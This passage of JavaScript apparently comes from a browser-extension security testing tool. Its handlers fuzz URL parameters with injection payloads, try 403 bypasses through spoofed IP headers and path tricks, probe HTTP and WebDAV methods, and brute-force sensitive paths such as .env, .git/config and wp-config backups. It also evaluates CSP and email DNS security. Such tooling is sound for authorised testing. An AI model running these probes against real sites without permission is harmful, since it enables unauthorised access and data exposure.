      for (const c of allCookies) {
        const cUrl = (c.secure ? 'https://' : 'http://') + c.domain.replace(/^\./, '') + c.path;
        try { await chrome.cookies.set({ url: cUrl, name: c.name, value: c.value, domain: c.domain, path: c.path, secure: c.secure, httpOnly: c.httpOnly, sameSite: c.sameSite === 'unspecified' ? 'no_restriction' : c.sameSite, expirationDate: c.expirationDate || undefined }); } catch {}
      }
      const results = [];
      const testCookies = msg.cookieNames || allCookies.map(c => c.name);
      for (const name of testCookies) {
        const c = allCookies.find(x => x.name === name);
        if (!c) { results.push({ name, status: 'skip', significant: false, role: 'unknown' }); continue; }
        const cUrl = (c.secure ? 'https://' : 'http://') + c.domain.replace(/^\./, '') + c.path;
        try {
          await chrome.cookies.remove({ url: cUrl, name: c.name });
          const r = await fetch(url, { credentials: 'include', redirect: 'manual', signal: AbortSignal.timeout(5000) });
          const body = await r.text();
          const statusChanged = r.status !== baseStatus;
          const bodyDiff = Math.abs(body.length - baseLen);
          const significant = statusChanged || bodyDiff > 200;
          results.push({ name, status: r.status, bodyLen: body.length, statusChanged, bodyDiff, significant, role: significant ? 'auth' : 'not-needed' });
          await chrome.cookies.set({ url: cUrl, name: c.name, value: c.value, domain: c.domain, path: c.path, secure: c.secure, httpOnly: c.httpOnly, sameSite: c.sameSite === 'unspecified' ? 'no_restriction' : c.sameSite, expirationDate: c.expirationDate || undefined });
        } catch (e) {
          try { await chrome.cookies.set({ url: cUrl, name: c.name, value: c.value, domain: c.domain, path: c.path, secure: c.secure, httpOnly: c.httpOnly, sameSite: c.sameSite === 'unspecified' ? 'no_restriction' : c.sameSite, expirationDate: c.expirationDate || undefined }); } catch {}
          results.push({ name, status: 'err', significant: false, role: 'unknown' });
        }
      }
      sr({ ok: true, baseStatus, baseLen, noStatus, noLen, siteUsesAuth: baseStatus !== noStatus || Math.abs(baseLen - noLen) > 200, results });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  DNS_LOOKUP: async (msg, _, sr) => {
    try {
      const types = ['A', 'AAAA', 'MX', 'TXT', 'NS', 'CNAME', 'CAA'];
      const results = {};
      for (const type of types) {
        try {
          const r = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(msg.domain)}&type=${type}`);
          const d = await r.json();
          if (d.Answer) results[type] = d.Answer.map(a => a.data);
        } catch {}
      }
      const emailSecurity = { spf: null, dmarc: null, dkim: [], mtaSts: null, bimi: null, findings: [] };
      const txts = results.TXT || [];
      const spfRecord = txts.find(t => t.toLowerCase().includes('v=spf1'));
      if (spfRecord) {
        emailSecurity.spf = spfRecord;
        if (spfRecord.includes('+all')) emailSecurity.findings.push({ severity: 'high', text: 'SPF +all — allows ANY server to send email (spoofable)' });
        else if (spfRecord.includes('~all')) emailSecurity.findings.push({ severity: 'medium', text: 'SPF ~all (softfail) — emails may still be delivered (spoofable with effort)' });
        else if (spfRecord.includes('?all')) emailSecurity.findings.push({ severity: 'medium', text: 'SPF ?all (neutral) — no enforcement' });
        else if (spfRecord.includes('-all')) emailSecurity.findings.push({ severity: 'low', text: 'SPF -all (hardfail) — properly configured' });
        // SPF lookup-count check: each include/redirect/a/mx counts; >10 = SPF PermError (Records over the limit silently fail)
        const lookups = (spfRecord.match(/\b(include|redirect|a|mx|exists|ptr):/g) || []).length;
        if (lookups > 10) emailSecurity.findings.push({ severity: 'medium', text: `SPF has ${lookups} DNS lookups (>10 = PermError; record silently invalid)` });
      } else {
        emailSecurity.findings.push({ severity: 'high', text: 'No SPF record — email spoofing possible' });
      }
      try {
        const dr = await fetch(`https://dns.google/resolve?name=_dmarc.${encodeURIComponent(msg.domain)}&type=TXT`);
        const dd = await dr.json();
        if (dd.Answer) {
          const dmarcRec = dd.Answer.find(a => a.data.includes('v=DMARC1'));
          if (dmarcRec) {
            emailSecurity.dmarc = dmarcRec.data;
            if (dmarcRec.data.includes('p=none')) emailSecurity.findings.push({ severity: 'medium', text: 'DMARC p=none — monitoring only, no enforcement' });
            else if (dmarcRec.data.includes('p=quarantine')) emailSecurity.findings.push({ severity: 'low', text: 'DMARC p=quarantine — suspicious mail quarantined' });
            else if (dmarcRec.data.includes('p=reject')) emailSecurity.findings.push({ severity: 'low', text: 'DMARC p=reject — properly configured' });
            // sp=none means subdomains are unprotected even when the apex is
            if (dmarcRec.data.includes('sp=none')) emailSecurity.findings.push({ severity: 'medium', text: 'DMARC sp=none — subdomains unprotected (spoofable)' });
          } else {
            emailSecurity.findings.push({ severity: 'high', text: 'No DMARC record — email spoofing possible' });
          }
        } else {
          emailSecurity.findings.push({ severity: 'high', text: 'No DMARC record — email spoofing possible' });
        }
      } catch {}

      // DKIM common selectors — probe in parallel
      const selectors = ['default', 'google', 'k1', 'k2', 'mail', 'selector1', 'selector2', 'mxvault', 's1', 's2', 'dkim'];
      const dkimChecks = await Promise.all(selectors.map(async sel => {
        try {
          const r = await fetch(`https://dns.google/resolve?name=${sel}._domainkey.${encodeURIComponent(msg.domain)}&type=TXT`);
          const d = await r.json();
          if (d.Answer) {
            const rec = d.Answer.find(a => /v=DKIM1/i.test(a.data));
            if (rec) return { selector: sel, value: rec.data };
          }
        } catch {}
        return null;
      }));
      emailSecurity.dkim = dkimChecks.filter(Boolean);
      if (!emailSecurity.dkim.length) emailSecurity.findings.push({ severity: 'low', text: 'No DKIM key found at common selectors — domain may not sign mail or uses non-standard selector' });

      // MTA-STS: TLS enforcement for inbound mail
      try {
        const mr = await fetch(`https://dns.google/resolve?name=_mta-sts.${encodeURIComponent(msg.domain)}&type=TXT`);
        const md = await mr.json();
        if (md.Answer) {
          const mtaRec = md.Answer.find(a => /v=STSv1/i.test(a.data));
          if (mtaRec) emailSecurity.mtaSts = mtaRec.data;
        }
      } catch {}

      // BIMI: brand indicator for messaging
      try {
        const br = await fetch(`https://dns.google/resolve?name=default._bimi.${encodeURIComponent(msg.domain)}&type=TXT`);
        const bd = await br.json();
        if (bd.Answer) {
          const bimiRec = bd.Answer.find(a => /v=BIMI1/i.test(a.data));
          if (bimiRec) emailSecurity.bimi = bimiRec.data;
        }
      } catch {}

      // CAA findings
      if (results.CAA) {
        emailSecurity.findings.push({ severity: 'low', text: `CAA records present (${results.CAA.length}) — restricts certificate issuers` });
      }

      sr({ ok: true, records: results, emailSecurity });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  WHOIS_LOOKUP: async (msg, _, sr) => {
    const domain = (msg.domain || '').toLowerCase().trim();
    if (!domain) { sr({ ok: false, error: 'No domain provided' }); return; }
    const tld = domain.split('.').pop();
    // Authoritative RDAP servers per TLD (subset of IANA's bootstrap registry — covers the common cases)
    const tldServers = {
      'com': 'https://rdap.verisign.com/com/v1',
      'net': 'https://rdap.verisign.com/net/v1',
      'org': 'https://rdap.publicinterestregistry.org/rdap',
      'io':  'https://rdap.identitydigital.services/rdap',
      'co':  'https://rdap.identitydigital.services/rdap',
      'app': 'https://rdap.nic.google',
      'dev': 'https://rdap.nic.google',
      'xyz': 'https://rdap.centralnic.com/xyz',
      'me':  'https://rdap.nic.me',
      'cc':  'https://rdap.verisign.com/cc/v1',
      'tv':  'https://rdap.verisign.com/tv/v1',
      'ai':  'https://rdap.nic.ai',
      'is':  'https://rdap.isnic.is',
    };
    // Build candidate list: TLD-specific first, then rdap.org as last resort
    const candidates = [];
    if (tldServers[tld]) candidates.push(`${tldServers[tld]}/domain/${encodeURIComponent(domain)}`);
    candidates.push(`https://rdap.org/domain/${encodeURIComponent(domain)}`);

    let lastErr = '';
    for (const url of candidates) {
      try {
        const r = await fetch(url, { signal: AbortSignal.timeout(8000), redirect: 'follow' });
        const text = await r.text();
        if (!r.ok && r.status !== 200) { lastErr = `HTTP ${r.status} from ${new URL(url).hostname}`; continue; }
        // Sanity-check it's RDAP JSON, not a Cloudflare block page
        if (!text.startsWith('{')) { lastErr = `Non-JSON response from ${new URL(url).hostname} (likely WAF blocked)`; continue; }
        try {
          const d = JSON.parse(text);
          sr({ ok: true, data: d, source: new URL(url).hostname });
          return;
        } catch { lastErr = `Malformed JSON from ${new URL(url).hostname}`; continue; }
      } catch (e) { lastErr = e.message; continue; }
    }
    sr({ ok: false, error: `All RDAP servers failed. Last error: ${lastErr}` });
  },

  DETECT_WP_PLUGINS: async (msg, _, sr) => {
    try {
      const r = await fetch(msg.url, { credentials: 'include' });
      const html = await r.text();
      const plugins = new Map();
      const re = /wp-content\/plugins\/([a-zA-Z0-9_-]+)(?:\/[^?"'\s]*)?(?:\?ver=([0-9.]+))?/g;
      let m;
      while ((m = re.exec(html)) !== null) {
        const name = m[1];
        const ver = m[2] || '';
        if (!plugins.has(name) || (ver && !plugins.get(name))) plugins.set(name, ver);
      }
      const themes = new Set();
      const reT = /wp-content\/themes\/([a-zA-Z0-9_-]+)/g;
      while ((m = reT.exec(html)) !== null) themes.add(m[1]);
      const wpVer = html.match(/<meta[^>]*name="generator"[^>]*content="WordPress\s*([^"]*)"/) ;
      sr({ ok: true, plugins: [...plugins.entries()].map(([n,v]) => ({name:n,version:v})), themes: [...themes], wpVersion: wpVer ? wpVer[1] : null });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  // ═══ PARAMETER FUZZER — Enhanced SSTI numbers, baseline comparison ═══
  PARAM_FUZZ: async (msg, _, sr) => {
    try {
      const baseUrl = new URL(msg.url);
      const params = [...baseUrl.searchParams.keys()];
      if (!params.length) { sr({ ok: true, results: [], params: [], message: 'No URL parameters found. Add ?param=value to test.' }); return; }

      const category = msg.category || 'xss';
      // Use the shared payload library — same source of truth as form-mode.
      const testPayloads = [...(FUZZ_PAYLOADS[category] || FUZZ_PAYLOADS.xss)];
      if (msg.customPayloads && msg.customPayloads.length) {
        msg.customPayloads.forEach(cp => testPayloads.push({ p: cp, check: 'reflected' }));
      }

      // Baseline timing
      let baselineLen = 0, baselineBody = '', baselineTime = 0;
      try {
        const t0 = Date.now();
        const br = await fetch(msg.url, { credentials: 'include', signal: AbortSignal.timeout(10000) });
        baselineTime = Date.now() - t0;
        baselineBody = await br.text();
        baselineLen = baselineBody.length;
      } catch {}

      const maxPayloads = msg.maxPayloads || testPayloads.length;
      const maxParams = msg.maxParams || Math.min(params.length, 8);
      const selectedParams = msg.selectedParams || null;
      const targetParams = selectedParams ? params.filter(p => selectedParams.includes(p)) : params.slice(0, maxParams);

      const results = [];
      for (const param of targetParams) {
        for (const { p: payload, check, expect } of testPayloads.slice(0, maxPayloads)) {
          const testUrl = new URL(msg.url);
          testUrl.searchParams.set(param, payload);
          const isTimeBased = check === 'sqli_blind_time';
          try {
            const t0 = Date.now();
            const r = await fetch(testUrl.toString(), { credentials: 'include', redirect: 'follow', signal: AbortSignal.timeout(isTimeBased ? 15000 : 5000) });
            const elapsed = Date.now() - t0;
            const body = await r.text();
            const rawReflected = body.includes(payload);
            let context = '';
            if (rawReflected) {
              const idx = body.indexOf(payload);
              context = body.slice(Math.max(0, idx - 80), Math.min(body.length, idx + payload.length + 80));
            }
            const ev = evaluateFuzzResult({
              check, payload, expect, body, baselineBody, baselineLen,
              elapsed, baselineTime, status: r.status, headers: r.headers,
              rawReflected, context,
            });
            let errorBody = '';
            if (r.status >= 500 && body.length < 5000) errorBody = body.slice(0, 500);
            results.push({
              param, payload,
              severity: ev.severity, analysis: ev.analysis,
              status: r.status, bodyLen: body.length, elapsed,
              context: ev.severity !== 'safe' ? ev.context : '',
              url: testUrl.toString(), errorBody,
              // Preview shown inline (truncated for the panel) AND full body for "Copy Response".
              // Cap full body at 1MB to avoid blowing up message-passing on giant responses.
              responsePreview: body.slice(0, 600),
              responseFull: body.length > 1_000_000 ? body.slice(0, 1_000_000) : body,
              responseTruncated: body.length > 1_000_000,
              responseTotalLen: body.length,
            });
          } catch (e) {
            results.push({ param, payload, severity: 'info', analysis: 'Request failed: ' + e.message, error: e.message });
          }
        }
      }
      sr({ ok: true, params, results, baselineLen, testedPayloads: Math.min(maxPayloads, testPayloads.length), totalPayloads: testPayloads.length });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  // CSP Evaluator
  EVALUATE_CSP: (msg, _, sr) => {
    const csp = msg.csp;
    if (!csp) { sr({ ok: false, error: 'No CSP header' }); return; }
    const findings = [];
    const directives = {};
    csp.split(';').forEach(d => {
      const parts = d.trim().split(/\s+/);
      if (parts.length) directives[parts[0]] = parts.slice(1);
    });

    // Whole-policy positive signals — these mitigate unsafe-inline in modern browsers
    const hasStrictDynamic = /'strict-dynamic'/.test(csp);
    const hasNonce = /'nonce-[A-Za-z0-9+/=_-]+'/.test(csp);
    const hasHash = /'(?:sha256|sha384|sha512)-[A-Za-z0-9+/=]+'/.test(csp);

    const checkUnsafe = (dir, values) => {
      if (!values) { findings.push({ severity: 'high', directive: dir, issue: 'Missing directive', detail: `No ${dir} defined — falls back to default-src or allows everything` }); return; }
      if (values.includes("'unsafe-inline'")) {
        // strict-dynamic + nonce/hash neutralizes unsafe-inline in CSP3 browsers
        if (hasStrictDynamic && (hasNonce || hasHash) && (dir === 'script-src' || dir === 'default-src')) {
          findings.push({ severity: 'low', directive: dir, issue: "'unsafe-inline' (mitigated)", detail: "Present as fallback; 'strict-dynamic' + nonce/hash neutralize this in modern browsers. Older browsers still affected." });
        } else {
          findings.push({ severity: 'high', directive: dir, issue: "'unsafe-inline'", detail: 'Allows inline scripts/styles — XSS bypass' });
        }
      }
      if (values.includes("'unsafe-eval'")) findings.push({ severity: 'high', directive: dir, issue: "'unsafe-eval'", detail: 'Allows eval() — XSS bypass via dynamic code execution' });
      if (values.includes('*')) findings.push({ severity: 'high', directive: dir, issue: 'Bare wildcard (*)', detail: 'Allows loading from any origin' });
      if (values.some(v => v === 'data:') && (dir === 'script-src' || dir === 'default-src')) findings.push({ severity: 'high', directive: dir, issue: 'data: in script-src', detail: 'data: scheme in script context = trivial XSS bypass' });
      else if (values.some(v => v === 'data:')) findings.push({ severity: 'medium', directive: dir, issue: 'data: URI', detail: 'Allows data: URIs — review usage' });
      if (values.some(v => v === 'blob:')) findings.push({ severity: 'low', directive: dir, issue: 'blob: URI', detail: 'Allows blob: URIs' });
      const cdnBypasses = ['cdn.jsdelivr.net', 'cdnjs.cloudflare.com', 'unpkg.com', 'raw.githubusercontent.com', 'ajax.googleapis.com', 'cdn.rawgit.com'];
      values.forEach(v => { if (cdnBypasses.some(c => v.includes(c))) findings.push({ severity: 'medium', directive: dir, issue: 'CDN with JSONP', detail: `${v} — known CSP bypass via JSONP-hosted libraries (AngularJS, etc.)` }); });
      values.forEach(v => { if (v.startsWith('*.') || v === 'https:' || v === 'http:') findings.push({ severity: 'medium', directive: dir, issue: 'Overly broad', detail: `${v} is too permissive` }); });
    };

    checkUnsafe('script-src', directives['script-src'] || directives['default-src']);
    checkUnsafe('style-src', directives['style-src'] || directives['default-src']);
    checkUnsafe('img-src', directives['img-src']);
    checkUnsafe('connect-src', directives['connect-src']);
    checkUnsafe('frame-src', directives['frame-src'] || directives['child-src']);
    checkUnsafe('object-src', directives['object-src']);

    // Positive signals — surface as info-level so users know what the CSP is doing right
    if (hasStrictDynamic) findings.push({ severity: 'info', directive: 'script-src', issue: "'strict-dynamic' present", detail: "Modern, secure CSP pattern — host whitelist is ignored, only nonce/hash-trusted scripts execute and load further scripts." });
    if (hasNonce) findings.push({ severity: 'info', directive: 'script-src', issue: 'Nonces in use', detail: 'Per-request nonces — strong inline-script control.' });
    if (directives['report-uri'] || directives['report-to']) findings.push({ severity: 'info', directive: 'reporting', issue: 'Violation reporting enabled', detail: 'Server collects CSP violation reports.' });

    if (!directives['default-src']) findings.push({ severity: 'medium', directive: 'default-src', issue: 'Missing default-src', detail: "No default-src — directives without an explicit value have no fallback" });
    if (!directives['object-src']) findings.push({ severity: 'medium', directive: 'object-src', issue: 'Missing object-src', detail: "No object-src — allows Flash/plugins unless blocked by default-src" });
    if (!directives['base-uri']) findings.push({ severity: 'medium', directive: 'base-uri', issue: 'Missing base-uri', detail: "No base-uri — allows <base> tag hijacking" });
    if (!directives['form-action']) findings.push({ severity: 'low', directive: 'form-action', issue: 'Missing form-action', detail: "No form-action — forms can submit to any origin" });
    if (!directives['frame-ancestors']) findings.push({ severity: 'medium', directive: 'frame-ancestors', issue: 'Missing frame-ancestors', detail: "No frame-ancestors — page can be framed (clickjacking)" });

    const highCount = findings.filter(f => f.severity === 'high').length;
    const medCount = findings.filter(f => f.severity === 'medium').length;
    const grade = highCount === 0 && medCount <= 1 ? 'A' : highCount === 0 ? 'B' : highCount <= 2 ? 'C' : highCount <= 4 ? 'D' : 'F';

    sr({ ok: true, directives, findings, grade, raw: csp, hasStrictDynamic, hasNonce, hasHash });
  },

  // ═══ 403 BYPASS — Enhanced: body comparison against homepage ═══
  BYPASS_403: async (msg, _, sr) => {
    const url = msg.url;
    const u = new URL(url);
    const path = u.pathname;
    const techniques = [
      // IP spoofing headers
      { type: 'header', name: 'X-Forwarded-For: 127.0.0.1', headers: { 'X-Forwarded-For': '127.0.0.1' } },
      { type: 'header', name: 'X-Forwarded-Host: 127.0.0.1', headers: { 'X-Forwarded-Host': '127.0.0.1' } },
      { type: 'header', name: 'X-Original-URL: ' + path, headers: { 'X-Original-URL': path } },
      { type: 'header', name: 'X-Rewrite-URL: ' + path, headers: { 'X-Rewrite-URL': path } },
      { type: 'header', name: 'X-Custom-IP-Authorization: 127.0.0.1', headers: { 'X-Custom-IP-Authorization': '127.0.0.1' } },
      { type: 'header', name: 'X-Real-IP: 127.0.0.1', headers: { 'X-Real-IP': '127.0.0.1' } },
      { type: 'header', name: 'X-Originating-IP: 127.0.0.1', headers: { 'X-Originating-IP': '127.0.0.1' } },
      { type: 'header', name: 'X-Client-IP: 127.0.0.1', headers: { 'X-Client-IP': '127.0.0.1' } },
      { type: 'header', name: 'X-Remote-IP: 127.0.0.1', headers: { 'X-Remote-IP': '127.0.0.1' } },
      { type: 'header', name: 'X-Host: localhost', headers: { 'X-Host': 'localhost' } },
      { type: 'header', name: 'Referer: ' + u.origin, headers: { 'Referer': u.origin + '/' } },
      // Path tricks
      { type: 'path', name: path + '/', url: u.origin + path + '/' },
      { type: 'path', name: path + '..;/', url: u.origin + path + '..;/' },
      { type: 'path', name: '/.' + path, url: u.origin + '/.' + path },
      { type: 'path', name: path + '%20', url: u.origin + path + '%20' },
      { type: 'path', name: path + '%09', url: u.origin + path + '%09' },
      { type: 'path', name: path + '?', url: u.origin + path + '?' },
      { type: 'path', name: path + '#', url: u.origin + path + '%23' },
      { type: 'path', name: path + '.json', url: u.origin + path + '.json' },
      { type: 'path', name: path + '..%2f', url: u.origin + path + '..%2f' },
      { type: 'path', name: '//' + path.replace(/^\/+/, ''), url: u.origin + '//' + path.replace(/^\/+/, '') },
      { type: 'path', name: '/' + path.split('/').pop(), url: u.origin + '/' + path.split('/').pop() },
      // Case variations on path segments — apply uppercase to last segment
      { type: 'path', name: 'Case: ' + path.toUpperCase(), url: u.origin + path.replace(/[^/]*$/, m => m.toUpperCase()) },
      // Method override
      { type: 'header', name: 'X-HTTP-Method-Override: GET', headers: { 'X-HTTP-Method-Override': 'GET' }, method: 'POST' },
      { type: 'header', name: 'X-Method-Override: GET', headers: { 'X-Method-Override': 'GET' }, method: 'POST' },
    ];
    try {
      // Baseline: target URL
      let baseStatus, baseBody = '';
      try { const br = await fetch(url, { credentials: 'include', signal: AbortSignal.timeout(5000) }); baseStatus = br.status; baseBody = await br.text(); } catch { baseStatus = 0; }

      // Homepage baseline: to filter false bypasses that just redirect home
      let homeBody = '';
      try { const hr = await fetch(u.origin + '/', { credentials: 'include', signal: AbortSignal.timeout(5000) }); homeBody = await hr.text(); } catch {}

      // Login page baseline: common redirect target
      let loginBody = '';
      try { const lr = await fetch(u.origin + '/login', { credentials: 'include', redirect: 'follow', signal: AbortSignal.timeout(3000) }); loginBody = await lr.text(); } catch {}

      const results = [{ technique: 'Baseline', status: baseStatus, type: 'baseline' }];
      for (const t of techniques) {
        try {
          const opts = { method: t.method || 'GET', headers: t.headers || {}, redirect: 'manual', credentials: 'include', signal: AbortSignal.timeout(5000) };
          const testUrl = t.url || url;
          const r = await fetch(testUrl, opts);
          const statusBypass = r.status >= 200 && r.status < 400 && baseStatus >= 400;
          let bypass = statusBypass;
          let verdict = '';
          let preview = '';

          // Enhanced: compare body against homepage/login to detect false bypasses
          if (statusBypass && r.status === 200) {
            const body = await r.text();
            preview = body.slice(0, 200);
            const similarToHome = homeBody && Math.abs(body.length - homeBody.length) < 200;
            const similarToLogin = loginBody && Math.abs(body.length - loginBody.length) < 200;
            if (similarToHome) {
              bypass = false;
              verdict = 'Returns homepage (not a real bypass)';
            } else if (similarToLogin) {
              bypass = false;
              verdict = 'Redirects to login (not a real bypass)';
            } else {
              verdict = 'Different content returned — investigate!';
            }
          } else if (statusBypass && (r.status === 301 || r.status === 302)) {
            const loc = r.headers.get('location') || '';
            if (loc.includes('login') || loc.includes('signin') || loc === u.origin + '/') {
              bypass = false;
              verdict = 'Redirects to ' + loc.split('/').pop() + ' (not a real bypass)';
            }
          }

          results.push({ technique: t.name, type: t.type, status: r.status, bypass, verdict, url: testUrl, preview: bypass ? preview : '' });
        } catch (e) {
          results.push({ technique: t.name, type: t.type, status: 'err', error: e.message });
        }
      }
      sr({ ok: true, baseStatus, results });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  // ═══ METHOD TESTER — Enhanced: TRACE echo detection ═══
  METHOD_TEST: async (msg, _, sr) => {
    // NOTE: TRACE is intentionally excluded. The Fetch standard forbids TRACE in
    // browser fetch() — it throws TypeError immediately. Servers that still respond
    // to TRACE require a raw HTTP client to test, which extensions cannot do.
    // Use the OPTIONS Allow header below as an indirect signal for TRACE support.
    const methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'HEAD'];
    // WebDAV methods — fetch() may reject some of these, but most modern Chrome accepts them
    const webdavMethods = ['PROPFIND', 'PROPPATCH', 'MKCOL', 'COPY', 'MOVE', 'LOCK', 'UNLOCK'];
    try {
      const baseStart = performance.now();
      let baseBody = '', baseStatus = 0, baseHeaders = {}, baseElapsed = 0;
      try {
        const br = await fetch(msg.url, { credentials: 'include', signal: AbortSignal.timeout(5000) });
        baseBody = await br.text(); baseStatus = br.status;
        br.headers.forEach((v, k) => { baseHeaders[k] = v; });
        baseElapsed = Math.round(performance.now() - baseStart);
      } catch {}

      const results = [{ method: 'GET', status: baseStatus, bodyLen: baseBody.length, headers: baseHeaders, baseline: true, elapsed: baseElapsed }];
      let optionsAllow = '';
      const runMethod = async (method, opts = {}) => {
        const start = performance.now();
        try {
          const r = await fetch(msg.url, { method, credentials: 'include', redirect: 'follow', signal: AbortSignal.timeout(5000), ...opts });
          const body = method === 'HEAD' ? '' : await r.text();
          const elapsed = Math.round(performance.now() - start);
          const rh = {}; r.headers.forEach((v, k) => { rh[k] = v; });
          return { method, status: r.status, bodyLen: body.length, headers: rh, body, elapsed };
        } catch (e) {
          return { method, status: 'err', error: e.message, elapsed: Math.round(performance.now() - start) };
        }
      };

      for (const method of methods.slice(1)) {
        const out = await runMethod(method);
        if (out.status === 'err') { results.push(out); continue; }
        const allow = out.headers['allow'] || '';
        if (method === 'OPTIONS' && allow) optionsAllow = allow;
        const bodyDiff = method !== 'HEAD' ? Math.abs(out.bodyLen - baseBody.length) : 0;
        const sameAsGet = bodyDiff < 50;
        const accepted = out.status >= 200 && out.status < 400;
        const realDanger = accepted && !sameAsGet && ['PUT','DELETE','PATCH'].includes(method);
        const fakeAccept = accepted && sameAsGet && ['PUT','DELETE','PATCH'].includes(method);
        results.push({ method, status: out.status, bodyLen: out.bodyLen, bodyDiff, sameAsGet, realDanger, fakeAccept, allow, headers: out.headers, preview: realDanger ? (out.body || '').slice(0, 300) : '', elapsed: out.elapsed });
      }
      // TRACE indirect detection
      if (/\bTRACE\b/i.test(optionsAllow)) {
        results.push({ method: 'TRACE', status: 'info', traceListed: true, allow: optionsAllow, note: 'OPTIONS Allow header lists TRACE — server may support Cross-Site Tracing. Verify with raw HTTP client (curl --request TRACE).' });
      }
      // WebDAV probe — mostly returns 405 unless server is a DAV target. Surface any 200/207 as interesting.
      const webdavSupported = [];
      for (const method of webdavMethods) {
        const out = await runMethod(method);
        if (out.status === 'err') continue;
        // 207 Multi-Status is the WebDAV success code for PROPFIND
        const accepted = out.status >= 200 && out.status < 300;
        if (accepted) webdavSupported.push({ method, status: out.status, elapsed: out.elapsed });
      }
      if (webdavSupported.length) {
        results.push({ method: 'WebDAV', status: 'info', webdavSupported, note: `WebDAV methods accepted: ${webdavSupported.map(w => `${w.method}(${w.status})`).join(', ')} — server is a WebDAV endpoint. Test for unauthenticated PUT, MKCOL with raw client.` });
      }
      sr({ ok: true, results });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  // Probe endpoints
  PROBE_ENDPOINTS: async (msg, _, sr) => {
    const results = [];
    const origin = new URL(msg.baseUrl).origin;
    const eps = msg.endpoints.slice(0, 40);
    for (let i = 0; i < eps.length; i += 8) {
      const batch = eps.slice(i, i + 8);
      const promises = batch.map(async (ep) => {
        const url = ep.startsWith('http') ? ep : origin + (ep.startsWith('/') ? ep : '/' + ep);
        try {
          const r = await fetch(url, { method: 'HEAD', redirect: 'follow', credentials: 'include', signal: AbortSignal.timeout(5000) });
          return { endpoint: ep, url, status: r.status };
        } catch {
          try {
            const r = await fetch(url, { redirect: 'follow', credentials: 'include', signal: AbortSignal.timeout(5000) });
            const len = (await r.text()).length;
            return { endpoint: ep, url, status: r.status, size: len };
          } catch { return { endpoint: ep, url, status: 'err' }; }
        }
      });
      (await Promise.all(promises)).forEach(r => results.push(r));
    }
    sr({ ok: true, results });
  },

  // Probe links
  PROBE_LINKS: async (msg, _, sr) => {
    const results = [];
    const links = msg.links.slice(0, 30).filter(u => {
      try { new URL(u); return true; } catch { return false; }
    });
    for (let i = 0; i < links.length; i += 8) {
      const batch = links.slice(i, i + 8);
      const promises = batch.map(async (url) => {
        try {
          const r = await fetch(url, { method: 'HEAD', redirect: 'follow', credentials: 'include', signal: AbortSignal.timeout(5000) });
          return { url, status: r.status, finalUrl: r.url !== url ? r.url : '' };
        } catch {
          try {
            const r = await fetch(url, { redirect: 'follow', credentials: 'include', signal: AbortSignal.timeout(5000) });
            return { url, status: r.status, finalUrl: r.url !== url ? r.url : '' };
          } catch (e) {
            return { url, status: 'dead', error: e.message?.includes('timeout') ? 'Timeout' : 'Connection failed' };
          }
        }
      });
      (await Promise.all(promises)).forEach(r => results.push(r));
    }
    sr({ ok: true, results });
  },

  // Probe subdomains
  PROBE_SUBDOMAINS: async (msg, _, sr) => {
    const results = [];
    const subs = msg.subdomains.slice(0, 50);
    for (let i = 0; i < subs.length; i += 10) {
      const batch = subs.slice(i, i + 10);
      const promises = batch.map(async (sub) => {
        try {
          const r = await fetch(`https://${sub}`, { redirect: 'follow', signal: AbortSignal.timeout(3000) });
          let title = '';
          if (r.status === 200) {
            try {
              const html = await r.text();
              const m = html.match(/<title[^>]*>([^<]{0,100})/i);
              if (m) title = m[1].trim();
            } catch {}
          }
          return { sub, status: r.status, title, url: r.url };
        } catch (e) {
          try {
            const r2 = await fetch(`http://${sub}`, { redirect: 'follow', signal: AbortSignal.timeout(3000) });
            return { sub, status: r2.status, title: '', url: r2.url, http: true };
          } catch {
            return { sub, status: 'dead', error: e.message?.includes('fetch') ? 'No response' : e.message };
          }
        }
      });
      (await Promise.all(promises)).forEach(r => results.push(r));
    }
    sr({ ok: true, results });
  },

  // ═══ DIR BRUTE — Enhanced: redirect destination check, body hash comparison ═══
  DIR_BRUTE: async (msg, _, sr) => {
    const pathSets = {
      common: ['/.git/HEAD', '/.env', '/robots.txt', '/sitemap.xml', '/.well-known/security.txt', '/admin', '/login', '/dashboard', '/graphql', '/api', '/swagger.json', '/.DS_Store', '/backup.zip', '/config.json', '/package.json', '/debug', '/console', '/server-status'],
      wordpress: ['/wp-login.php', '/wp-admin/', '/wp-config.php', '/wp-config.php.bak', '/wp-config.php.old', '/wp-content/', '/wp-includes/', '/wp-json/', '/wp-json/wp/v2/users', '/xmlrpc.php', '/wp-cron.php', '/readme.html', '/license.txt', '/wp-content/debug.log', '/wp-content/uploads/', '/wp-content/plugins/', '/wp-admin/install.php'],
      php_laravel: ['/phpinfo.php', '/info.php', '/test.php', '/.env', '/.env.local', '/.env.production', '/.env.backup', '/storage/logs/laravel.log', '/vendor/', '/artisan', '/telescope', '/horizon', '/nova', '/_debugbar', '/config/app.php'],
      java_spring: ['/actuator', '/actuator/health', '/actuator/env', '/actuator/mappings', '/actuator/beans', '/actuator/configprops', '/actuator/heapdump', '/swagger-ui.html', '/swagger.json', '/v2/api-docs', '/v3/api-docs', '/jolokia', '/console', '/h2-console', '/druid'],
      dotnet: ['/web.config', '/elmah.axd', '/trace.axd', '/Trace.axd', '/applicationinsights', '/_blazor', '/api/swagger', '/hangfire', '/miniprofiler', '/Elmah', '/Error'],
      node_js: ['/package.json', '/package-lock.json', '/.npmrc', '/node_modules/', '/server.js', '/app.js', '/.env', '/config.json', '/graphql', '/graphiql', '/__webpack_hmr', '/_next/data', '/api/health'],
      devops: ['/.git/HEAD', '/.git/config', '/.gitignore', '/.svn/entries', '/.hg/', '/CVS/Root', '/.dockerenv', '/Dockerfile', '/docker-compose.yml', '/.github/', '/.gitlab-ci.yml', '/Jenkinsfile', '/.circleci/config.yml', '/Makefile'],
      backups: ['/backup', '/backup.zip', '/backup.tar.gz', '/backup.sql', '/dump.sql', '/db.sql', '/database.sql', '/site.tar.gz', '/www.zip', '/.bak', '/old/', '/copy/', '/temp/'],
    };
    const category = msg.category || 'common';
    const paths = category === 'all' ? [...new Set(Object.values(pathSets).flat())] : pathSets[category] || pathSets.common;

    try {
      const u = new URL(msg.url);
      const origin = u.origin;
